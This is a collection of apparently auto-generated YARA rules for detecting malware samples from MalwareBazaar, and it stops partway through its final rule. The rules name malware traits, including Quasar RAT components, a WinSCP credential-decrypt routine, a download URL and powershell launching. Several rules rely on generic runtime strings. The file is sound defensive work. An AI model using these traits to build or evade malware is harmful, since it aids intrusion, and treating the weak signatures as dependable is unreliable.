rule Windows_26063c78e5418610471a9f3a00a155d7d1e5b29856e1979ba3bdc42681a871d0
{
    meta:
        description = "Auto ML: 26063c78e5418610471a9f3a00a155d7d1e5b29856e1979ba3bdc42681a871d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 359KB and
        all of them
}

rule Android_26247bcb312c2e8610f440582b10d0468c9fb7f5cc3eb0e36491262539361b59
{
    meta:
        description = "Auto ML: 26247bcb312c2e8610f440582b10d0468c9fb7f5cc3eb0e36491262539361b59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KGeTm|lX"
        $s2 = "WinY"
        $s3 = "cmdccC&"
        $s4 = "classes.dex/layout/abc_action_mode_close_item_material.xml"
        $s5 = "AndroidManifest.xml/layout/loading.xml"
        $s6 = "classes.dex/layout/notification_template_custom_big.xml"
        $s7 = "AndroidManifest.xml/layout/notification_template_icon_group.xml"
        $s8 = "resources.arsc/layout/notification_template_part_chronometer.xmlm"
        $s9 = "classes.dex/layout/notification_template_part_time.xmlm"
        $s10 = "..res/layout/notification_template_part_time.xml"
        $s11 = "55res/layout/notification_template_part_chronometer.xml"
        $s12 = "//res/layout/notification_template_icon_group.xml"
        $s13 = "//res/layout/notification_template_custom_big.xml"
        $s14 = "res/layout/loading.xml"
        $s15 = "22res/layout/abc_action_mode_close_item_material.xml"
        $s16 = "System Keyboard"
        $s17 = ",,androidx.appcompat.app.AppCompatViewInflater"
        $s18 = "\"\"angelapsmgdepbjmznbrlkgettheokh863"
        $s19 = "##threadsuuszeqrqqvidfiukenzhhysjv861"
        $s20 = "##moduleshcxzamchfljxybenwgkfhwuxj857"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 3853KB and
        all of them
}

rule Windows_262f8a0bec693fefee2b30858530582d1d066c8200c32d2a14f8d745cba13235
{
    meta:
        description = "Auto ML: 262f8a0bec693fefee2b30858530582d1d066c8200c32d2a14f8d745cba13235"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "NBYS AH.NET.exe"
        $s6 = "System"
        $s7 = "<Module>"
        $s8 = "System.IO"
        $s9 = "Read"
        $s10 = "Write"
        $s11 = "System.Resources"
        $s12 = "System.Globalization"
        $s13 = "GetTypeFromHandle"
        $s14 = "get_Assembly"
        $s15 = "System.Reflection"
        $s16 = "GetObject"
        $s17 = "System.CodeDom.Compiler"
        $s18 = "DebuggerNonUserCodeAttribute"
        $s19 = "System.Diagnostics"
        $s20 = "ReadByte"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3325KB and
        all of them
}

rule Linux_263999c1cc936d4a84801f7f66fe0b8a34180ac98bae69d43c23c8552e9da311
{
    meta:
        description = "Auto ML: 263999c1cc936d4a84801f7f66fe0b8a34180ac98bae69d43c23c8552e9da311"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "7;wgetw"
        $s2 = "`HTTP/"
        $s3 = "User-A"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 60KB and
        all of them
}

rule Linux_0311393f5cd90c578567881c484b1c0808b950c1f6455888234e3f4ff9da4580
{
    meta:
        description = "Auto ML: 0311393f5cd90c578567881c484b1c0808b950c1f6455888234e3f4ff9da4580"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = "processor"
        $s6 = "/sys/devices/system/cpu"
        $s7 = "_Unwind_VRS_Get"
        $s8 = "_Unwind_VRS_Set"
        $s9 = "_Unwind_GetCFA"
        $s10 = "_Unwind_Complete"
        $s11 = "_Unwind_DeleteException"
        $s12 = "_Unwind_GetTextRelBase"
        $s13 = "_Unwind_GetDataRelBase"
        $s14 = "__gnu_Unwind_ForcedUnwind"
        $s15 = "__gnu_Unwind_Resume"
        $s16 = "__gnu_Unwind_RaiseException"
        $s17 = "__gnu_Unwind_Resume_or_Rethrow"
        $s18 = "_Unwind_VRS_Pop"
        $s19 = "__aeabi_unwind_cpp_pr2"
        $s20 = "__aeabi_unwind_cpp_pr1"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 122KB and
        all of them
}

rule Windows_26680ffe5ffede770697186e8107ec7251f50414502e4574d39bee3cb67f156d
{
    meta:
        description = "Auto ML: 26680ffe5ffede770697186e8107ec7251f50414502e4574d39bee3cb67f156d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<get_Items>b__5_0"
        $s5 = "HashSet`1"
        $s6 = "get_DataTable1"
        $s7 = "get_DataColumn1"
        $s8 = "set_DataColumn1"
        $s9 = "DataSet1"
        $s10 = "<get_Connectors>d__12"
        $s11 = "get_DataColumn2"
        $s12 = "set_DataColumn2"
        $s13 = "<connection>5__3"
        $s14 = "get_DataColumn3"
        $s15 = "set_DataColumn3"
        $s16 = "<Module>"
        $s17 = "System.Drawing.Drawing2D"
        $s18 = "System.IO"
        $s19 = "get_VzOR"
        $s20 = "System.Xml.Schema"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 676KB and
        all of them
}

rule Windows_26a281534bcbf467b36882cb224d95e6f93e6307bd4b6c82cfe16f1c4b30bc32
{
    meta:
        description = "Auto ML: 26a281534bcbf467b36882cb224d95e6f93e6307bd4b6c82cfe16f1c4b30bc32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Linux_26a7fb12ebe190da2a0b886ee84363dfd18a8dc8ad93e56140dcb29173117fb0
{
    meta:
        description = "Auto ML: 26a7fb12ebe190da2a0b886ee84363dfd18a8dc8ad93e56140dcb29173117fb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB and
        all of them
}

rule Windows_26bd4a40d12d5483b5cf8a0a2db0dddb151b0b3206079dcf2782834482a2c3b7
{
    meta:
        description = "Auto ML: 26bd4a40d12d5483b5cf8a0a2db0dddb151b0b3206079dcf2782834482a2c3b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GetProcessWindowStation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 684KB and
        all of them
}

rule Windows_26ed54f0d441f0f3dd744f03f30d8f1fa01de0ed267df7b7fec4c9b2eab742d2
{
    meta:
        description = "Auto ML: 26ed54f0d441f0f3dd744f03f30d8f1fa01de0ed267df7b7fec4c9b2eab742d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "get_ooSJ"
        $s11 = "getInstancia"
        $s12 = "get_paginaWebEmpresa"
        $s13 = "set_paginaWebEmpresa"
        $s14 = "get_razonSocialEmpresa"
        $s15 = "set_razonSocialEmpresa"
        $s16 = "get_direccionEmpresa"
        $s17 = "set_direccionEmpresa"
        $s18 = "get_correoEmpresa"
        $s19 = "set_correoEmpresa"
        $s20 = "get_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 983KB and
        all of them
}

rule Windows_26f693ee7807e9a341eb9936519194f587d1bd2998fdb734d36cd62b9a46b8b1
{
    meta:
        description = "Auto ML: 26f693ee7807e9a341eb9936519194f587d1bd2998fdb734d36cd62b9a46b8b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "createMT"
        $s6 = "set_ChartArea"
        $s7 = "add_Load"
        $s8 = "dothi_Load"
        $s9 = "F_Detail_Load"
        $s10 = "get_Checked"
        $s11 = "set_Handled"
        $s12 = "set_Legend"
        $s13 = "get_KeyCode"
        $s14 = "set_AutoScaleMode"
        $s15 = "get_Message"
        $s16 = "set_Visible"
        $s17 = "GetTypeFromHandle"
        $s18 = "set_FormBorderStyle"
        $s19 = "set_Name"
        $s20 = "set_Multiline"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 689KB and
        all of them
}

rule Windows_273859ef9dc73be91fe0e0b46e8152b22e2a5e3f8fc9a8e5549e1f4002476dfd
{
    meta:
        description = "Auto ML: 273859ef9dc73be91fe0e0b46e8152b22e2a5e3f8fc9a8e5549e1f4002476dfd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "window"
        $s8 = "ProcessBar"
        $s9 = "Download"
        $s10 = "http://kzemail.googlecode.com/files/qqqfwlyz.zip"
        $s11 = "\\temp.temp"
        $s12 = "anonymous@123.com"
        $s13 = "CFile"
        $s14 = "CMemFile"
        $s15 = "CTempGdiObject"
        $s16 = "CTempDC"
        $s17 = "CWindowDC"
        $s18 = "CUserException"
        $s19 = "MS Shell Dlg"
        $s20 = "CTempWnd"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 784KB and
        all of them
}

rule Windows_2739b41aab3ff3cc0727ada7ad04162f0379ef151c7d4b4296e963a2a74891c5
{
    meta:
        description = "Auto ML: 2739b41aab3ff3cc0727ada7ad04162f0379ef151c7d4b4296e963a2a74891c5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 301KB and
        all of them
}

rule Windows_273a825120c70825c6726ce2c33c9312de4a24fc5a530a52ff8bc95bcd1cea4f
{
    meta:
        description = "Auto ML: 273a825120c70825c6726ce2c33c9312de4a24fc5a530a52ff8bc95bcd1cea4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "BgET"
        $s3 = "yset4"
        $s4 = "GetModuleHandleA"
        $s5 = "GetProcAddress"
        $s6 = "KERNEL32.DLL"
        $s7 = "USER32.dll"
        $s8 = "SetBkMode"
        $s9 = "OLEAUT32.dll"
        $s10 = "MSVCRT.dll"
        $s11 = "VERSION.dll"
        $s12 = "GetFileVersionInfoW"
        $s13 = "If you want to change the Windows User Account Control level replace the"
        $s14 = "requestedExecutionLevel node with one of the following."
        $s15 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s16 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s17 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s18 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s19 = "<!-- A list of the Windows versions that this application has been tested on"
        $s20 = "and Windows will automatically select the most compatible environment. -->"
    condition:
        uint32(0) == 0x00405a4d and
        filesize < 5504KB and
        all of them
}

rule Windows_2774262a54ea6008d5b508f4d95eb811bd5d7dc50e1c0659d016ab33d966e729
{
    meta:
        description = "Auto ML: 2774262a54ea6008d5b508f4d95eb811bd5d7dc50e1c0659d016ab33d966e729"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s6 = "System.Drawing.Icon"
        $s7 = "System.Drawing.Size"
        $s8 = "ISystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $s9 = "System.CodeDom.MemberAttributes"
        $s10 = "System.Globalization.CultureInfo"
        $s11 = "m_isReadOnly"
        $s12 = "m_useUserOverride"
        $s13 = "System.Globalization.CompareInfo"
        $s14 = "System.Globalization.TextInfo%System.Globalization.NumberFormatInfo'System.Globalization.DateTimeFormatInfo"
        $s15 = "System.Globalization.Calendar"
        $s16 = "win32LCID"
        $s17 = "System.Globalization.SortVersion"
        $s18 = "System.Globalization.TextInfo"
        $s19 = "m_win32LangID"
        $s20 = "%System.Globalization.NumberFormatInfo\""
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 783KB and
        all of them
}

rule Windows_0341c1348baae5bc2bb53f7c39724eaeaaa929e4d2c11474b267ed064e45f455
{
    meta:
        description = "Auto ML: 0341c1348baae5bc2bb53f7c39724eaeaaa929e4d2c11474b267ed064e45f455"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "System.Collections.Generic"
        $s7 = "Thread"
        $s8 = "get_Build"
        $s9 = "DownloadFile"
        $s10 = "GetFileName"
        $s11 = "get_MachineName"
        $s12 = "get_UserName"
        $s13 = "WriteLine"
        $s14 = "TargetFrameworkAttribute"
        $s15 = "AssemblyFileVersionAttribute"
        $s16 = "bomb.exe"
        $s17 = "System.Threading"
        $s18 = "System.Runtime.Versioning"
        $s19 = "DownloadString"
        $s20 = "OperatingSystem"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 12KB and
        all of them
}

rule Windows_27e2722049ed670474ba068763442df1a11930feb437552454801ebe9e59d59a
{
    meta:
        description = "Auto ML: 27e2722049ed670474ba068763442df1a11930feb437552454801ebe9e59d59a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "System.IO"
        $s9 = "System.Data"
        $s10 = "System.Collections.Generic"
        $s11 = "Read"
        $s12 = "add_Load"
        $s13 = "get_IsDisposed"
        $s14 = "CreateInstance"
        $s15 = "set_DataSource"
        $s16 = "GetHashCode"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_ColumnHeadersHeightSizeMode"
        $s19 = "get_Message"
        $s20 = "get_TypeHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 729KB and
        all of them
}

rule Linux_27f88961167dfcc381ab480cd8bce6120fa53795e1bcf7d30f5489c8cef857c3
{
    meta:
        description = "Auto ML: 27f88961167dfcc381ab480cd8bce6120fa53795e1bcf7d30f5489c8cef857c3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 89KB and
        all of them
}

rule Windows_2854e234da3cf8855095e1b74f3bb61e5a39ebd534b531f46d875add3eb29312
{
    meta:
        description = "Auto ML: 2854e234da3cf8855095e1b74f3bb61e5a39ebd534b531f46d875add3eb29312"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "DeleteFileW"
        $s8 = "FindFirstFileW"
        $s9 = "FindNextFileW"
        $s10 = "FindClose"
        $s11 = "SetFilePointer"
        $s12 = "ReadFile"
        $s13 = "GetPrivateProfileStringW"
        $s14 = "WritePrivateProfileStringW"
        $s15 = "LoadLibraryExW"
        $s16 = "GetModuleHandleW"
        $s17 = "CloseHandle"
        $s18 = "SetFileTime"
        $s19 = "CompareFileTime"
        $s20 = "GetShortPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 64198KB and
        all of them
}

rule Windows_28bf3281a92f4c95bef7a0b410e4eb1ac4c829732793f6ccdc8cf6002669ea9d
{
    meta:
        description = "Auto ML: 28bf3281a92f4c95bef7a0b410e4eb1ac4c829732793f6ccdc8cf6002669ea9d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_28cd0d3593ae207a9ac7d4cb4ebb6d28293db50e9e5026e703e4bf56a83e7b9b
{
    meta:
        description = "Auto ML: 28cd0d3593ae207a9ac7d4cb4ebb6d28293db50e9e5026e703e4bf56a83e7b9b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Drawing.Drawing2D"
        $s6 = "GetLI"
        $s7 = "System.IO"
        $s8 = "System.Collections.Generic"
        $s9 = "get_CanRead"
        $s10 = "buttonLoad"
        $s11 = "get_windSpeed"
        $s12 = "set_Enabled"
        $s13 = "set_FormattingEnabled"
        $s14 = "<windSpeed>k__BackingField"
        $s15 = "<temperature>k__BackingField"
        $s16 = "<windDirection>k__BackingField"
        $s17 = "set_AutoScaleMode"
        $s18 = "FileMode"
        $s19 = "set_SizeMode"
        $s20 = "get_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 638KB and
        all of them
}

rule Windows_293b577a8ca51eb4c86e46d28332ee3ed07f9fee2ad938b2a0628d9482b0bfdc
{
    meta:
        description = "Auto ML: 293b577a8ca51eb4c86e46d28332ee3ed07f9fee2ad938b2a0628d9482b0bfdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "3CXVSRWR.exe"
        $s6 = "System"
        $s7 = "System.Runtime.CompilerServices"
        $s8 = "System.Diagnostics"
        $s9 = "ProcessStartInfo"
        $s10 = "set_FileName"
        $s11 = "set_Arguments"
        $s12 = "ProcessWindowStyle"
        $s13 = "set_WindowStyle"
        $s14 = "set_CreateNoWindow"
        $s15 = "Process"
        $s16 = "mscoree.dll"
        $s17 = "powershell"
        $s18 = "VarFileInfo"
        $s19 = "StringFileInfo"
        $s20 = "FileDescription"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB and
        all of them
}

rule Linux_294a0e4e151ce90c5934d26e0739fc1afa6157e3f11a38e33adf8f921e34a1f9
{
    meta:
        description = "Auto ML: 294a0e4e151ce90c5934d26e0739fc1afa6157e3f11a38e33adf8f921e34a1f9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB and
        all of them
}

rule Linux_2988e76af76609dbbb8a0fecde150d1b4aeb507096b0eba72ef22e5a8b54baee
{
    meta:
        description = "Auto ML: 2988e76af76609dbbb8a0fecde150d1b4aeb507096b0eba72ef22e5a8b54baee"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "8fileu"
        $s2 = "9windu"
        $s3 = ":windu"
        $s4 = "open"
        $s5 = ":fileu"
        $s6 = ";fileup"
        $s7 = "?fileu("
        $s8 = "load"
        $s9 = "9httptA"
        $s10 = "9httpu"
        $s11 = "9httpuv"
        $s12 = "http"
        $s13 = "httpu"
        $s14 = "File"
        $s15 = "Load"
        $s16 = "Open"
        $s17 = "Read"
        $s18 = "User"
        $s19 = "file"
        $s20 = "user"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 13460KB and
        all of them
}

rule Windows_29af1a36104a0658965ae9fde483b4ca9c5c849e3f2edee8c3e3231c5a7a696a
{
    meta:
        description = "Auto ML: 29af1a36104a0658965ae9fde483b4ca9c5c849e3f2edee8c3e3231c5a7a696a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "System.IO"
        $s9 = "System.Data"
        $s10 = "get_KeyData"
        $s11 = "System.Collections.Generic"
        $s12 = "gi_userSuc"
        $s13 = "Thread"
        $s14 = "Load"
        $s15 = "CreateInstance"
        $s16 = "get_GetInstance"
        $s17 = "GetHashCode"
        $s18 = "GetTypeFromHandle"
        $s19 = "File"
        $s20 = "ChangeType"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 370KB and
        all of them
}

rule Windows_29f281cac20928673a516da70a1495cf217aea2dc386d7719de2df7c2053fb9d
{
    meta:
        description = "Auto ML: 29f281cac20928673a516da70a1495cf217aea2dc386d7719de2df7c2053fb9d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Core"
        $s13 = "System.Security"
        $s14 = "SecurityRuleSet"
        $s15 = "reserves_at_large_range_scales.exe"
        $s16 = "<Module>"
        $s17 = "ThreadSafeObjectProvider`1"
        $s18 = "MySettings"
        $s19 = "ApplicationSettingsBase"
        $s20 = "System.Configuration"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5132KB and
        all of them
}

rule Windows_00415d3dbe1002e36e94d9e11459872b7fd485ffc59a4d96a7c8e7e5df80186b
{
    meta:
        description = "Auto ML: 00415d3dbe1002e36e94d9e11459872b7fd485ffc59a4d96a7c8e7e5df80186b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
